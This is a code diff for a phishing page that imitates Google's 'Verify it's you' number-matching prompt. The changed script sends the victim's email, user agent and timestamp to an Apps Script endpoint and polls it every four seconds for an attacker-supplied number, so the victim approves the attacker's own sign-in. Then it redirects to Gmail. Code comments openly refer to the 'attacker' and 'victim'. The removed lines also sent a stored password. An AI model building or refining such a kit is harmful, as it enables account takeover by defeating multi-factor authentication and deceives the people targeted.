@@ -3,40 +3,55 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Sign in - Google</title>
+  <title>Verify it's you - Google</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="style.css" />
   <style>
-    .number-box {
-      font-size: 72px;
+    body { font-family: 'Roboto', sans-serif; background: #f1f3f4; margin: 0; }
+    .page-center { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+    .card { background: white; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); padding: 40px; max-width: 480px; width: 100%; }
+    .logo svg { width: 48px; height: 48px; }
+    .account-selector { display: flex; align-items: center; margin: 24px 0; }
+    .avatar-circle { width: 48px; height: 48px; border-radius: 50%; background: #1a73e8; color: white; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 500; margin-right: 12px; }
+    .email-pill { background: #e8f0fe; padding: 8px 16px; border-radius: 20px; font-size: 14px; }
+    h1 { font-size: 28px; margin: 8px 0; color: #202124; }
+    .subtitle { font-size: 16px; color: #5f6368; margin-bottom: 32px; }
+    .prompt-container { text-align: center; margin: 32px 0; }
+    .match-number {
+      font-size: 120px;
       font-weight: bold;
-      color: #1a73e8;
-      background: #e8f0fe;
-      padding: 20px 40px;
-      border-radius: 12px;
+      color: #1967d2;
+      background: #e3f2fd;
+      width: 240px;
+      height: 160px;
+      line-height: 160px;
       margin: 24px auto;
-      text-align: center;
-      max-width: 300px;
-      border: 2px solid #1a73e8;
+      border-radius: 16px;
+      border: 4px solid #1967d2;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      user-select: none;
     }
-    .instructions {
-      font-size: 18px;
-      margin: 16px 0;
-      line-height: 1.5;
-    }
+    .description { color: #5f6368; font-size: 15px; line-height: 1.5; max-width: 380px; margin: 0 auto; }
+    .actions { text-align: right; margin-top: 40px; }
+    .primary { background: #1a73e8; color: white; border: none; padding: 12px 32px; border-radius: 4px; font-size: 16px; cursor: pointer; }
+    .primary:disabled { background: #a0c4f9; cursor: not-allowed; }
+    footer { text-align: center; padding: 24px; color: #5f6368; font-size: 12px; }
   </style>
 </head>
 <body>
   <div class="page-center">
     <div class="card">
       <div class="logo">
-        <!-- same Google logo SVG as before -->
         <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
-          <!-- ... paste your original logo paths here ... -->
+          <path fill="#EA4335" d="M24 9.5c3.54 0 6.14 1.53 7.56 2.8l5.5-5.5C33.64 3.6 29.22 1.5 24 1.5 14.98 1.5 7.2 6.68 3.44 14.24l6.66 5.18C11.84 13.3 17.42 9.5 24 9.5z"/>
+          <path fill="#4285F4" d="M46.14 24.5c0-1.57-.14-3.08-.4-4.5H24v8.52h12.44c-.54 2.9-2.2 5.36-4.66 7.04l7.2 5.6c4.2-3.88 6.6-9.6 6.6-16.66z"/>
+          <path fill="#FBBC05" d="M10.1 28.58c-.48-1.42-.76-2.94-.76-4.58s.28-3.16.76-4.58l-6.66-5.18C1.78 17.1.9 20.46.9 24s.88 6.9 2.54 9.76l6.66-5.18z"/>
+          <path fill="#34A853" d="M24 46.5c6.48 0 11.92-2.14 15.9-5.84l-7.2-5.6c-2 1.34-4.56 2.14-8.7 2.14-6.58 0-12.16-3.8-13.9-9.02l-6.66 5.18C7.2 41.32 14.98 46.5 24 46.5z"/>
         </svg>
       </div>
+
       <div class="account-selector">
         <div class="avatar-circle" id="avatar"></div>
         <div class="email-pill">
@@ -44,29 +59,28 @@
           <span class="dropdown-arrow">▼</span>
         </div>
       </div>
-      <h1>Verify it's you</h1>
-      <p class="subtitle">Check your phone</p>
-      
-      <div class="instructions">
-        Tap <strong>Yes</strong> on your phone to sign in.<br>
-        Then select the number shown below on your device.
+
+      <h1>Check your phone</h1>
+      <p class="subtitle">Tap <strong>Yes</strong> on the Google prompt on your phone</p>
+
+      <div class="prompt-container">
+        <div class="description">Then select the number shown on this screen:</div>
+        <div class="match-number" id="matchNumber">Waiting...</div>
       </div>
-      
-      <div class="number-box" id="matchNumber">••</div>
-      
-      <div class="description" style="text-align:center; margin-top:24px; color:#5f6368; font-size:14px;">
-        This helps keep your account secure by making sure it's really you.
+
+      <div class="description">
+        This extra step helps make sure it's really you trying to sign in.
       </div>
-      
-      <div class="actions" style="margin-top:32px;">
-        <button type="button" class="primary" disabled>Waiting for confirmation...</button>
+
+      <div class="actions">
+        <button type="button" class="primary" disabled>Waiting for verification...</button>
       </div>
     </div>
   </div>
-  
-  <footer class="footer">
-    <div class="lang-select">English (United States) ▼</div>
-    <div class="footer-links">Help · Privacy · Terms</div>
+
+  <footer>
+    <div>English (United States) ▼</div>
+    <div>Help · Privacy · Terms</div>
   </footer>
 
   <script>
@@ -76,34 +90,41 @@
     const initial = usernamePart.charAt(0).toUpperCase();
     document.getElementById("avatar").textContent = initial;
 
-    // Generate a random 2-digit number (Google usually shows 2 digits)
-    function generateNumber() {
-      return Math.floor(10 + Math.random() * 90);  // 10-99
-    }
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxxwtqSxcM3xKDVY4vaXQ1E44cosqIVI9HM0guLL8GHe2hEV3S9EmQ1Pr46jzWZa9zS/exec";
 
-    const matchNumber = generateNumber();
-    document.getElementById("matchNumber").textContent = matchNumber;
-
-    // Immediately send the number + email to attacker (so they see it in real-time)
-    const params = new URLSearchParams();
-    params.append("email", email);
-    params.append("password", localStorage.getItem("demoPassword") || ""); // optional: pass previous pass if stored
-    params.append("prompt_number", matchNumber);
-    params.append("stage", "prompt_shown");
-
-    fetch("https://script.google.com/macros/s/AKfycbxxwtqSxcM3xKDVY4vaXQ1E44cosqIVI9HM0guLL8GHe2hEV3S9EmQ1Pr46jzWZa9zS/exec", {
+    // Notify attacker that victim is waiting
+    fetch(SCRIPT_URL, {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: params
-    }).catch(err => console.error("Failed to send number", err));
+      body: new URLSearchParams({
+        action: "victim_ready",
+        email: email,
+        user_agent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+      })
+    }).catch(() => {});
 
-    // Optional: poll or websocket to detect if victim "confirmed" (but most kits just wait / redirect after delay)
-    // For simplicity, auto-redirect after ~45 seconds (average time victim takes)
+    // Poll for the number the attacker set
+    function checkForNumber() {
+      fetch(`${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}`)
+        .then(r => r.json())
+        .then(data => {
+          if (data && data.prompt_number) {
+            document.getElementById("matchNumber").textContent = data.prompt_number;
+            document.getElementById("matchNumber").style.background = "#e3f2fd";
+          }
+        })
+        .catch(() => {});
+    }
+
+    setInterval(checkForNumber, 4000); // Poll every 4 seconds
+    checkForNumber(); // Immediate check
+
+    // Auto-redirect after 3 minutes if nothing happens
     setTimeout(() => {
       localStorage.removeItem("demoEmail");
-      // localStorage.removeItem("demoPassword"); // if you stored it
       window.location.href = "https://mail.google.com/";
-    }, 45000);
+    }, 180000);
   </script>
 </body>
 </html>
